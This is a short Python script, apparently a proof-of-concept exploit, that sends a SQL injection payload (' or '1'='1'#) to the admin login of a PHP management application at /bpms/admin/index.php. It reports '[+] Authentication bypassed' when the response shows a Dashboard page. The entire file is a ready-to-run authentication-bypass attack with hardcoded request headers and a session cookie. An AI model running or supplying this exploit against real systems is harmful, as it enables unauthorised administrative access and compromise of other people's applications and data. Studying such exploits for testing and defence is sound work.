import requests
import re

#url = "http://ipv4/bpms/admin/index.php"
url = input("Enter url: ")
payload = "username=%27+or+%271%27%3D%271%27%23&password=asdasd&login="
headers = {
    "Host": "172.21.183.227",
    "Content-Length": "66",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://172.21.183.227",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": url,
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "PHPSESSID=4hd6e0b3k1832l46l1gm6s4qj3",
    "Connection": "close"
}

response = requests.post(url, data=payload, headers=headers)
pattern = "Dashboard"
if re.findall(pattern, response.text):
    print("[+] Authentication bypassed using the following payload: " + payload)
else:
    for resp in response.history:
        if re.findall(pattern, resp.text):
            print("[+] Authentication bypassed using the following payload: " + payload)
            break
    else:
        print("[-] Something went wrong")
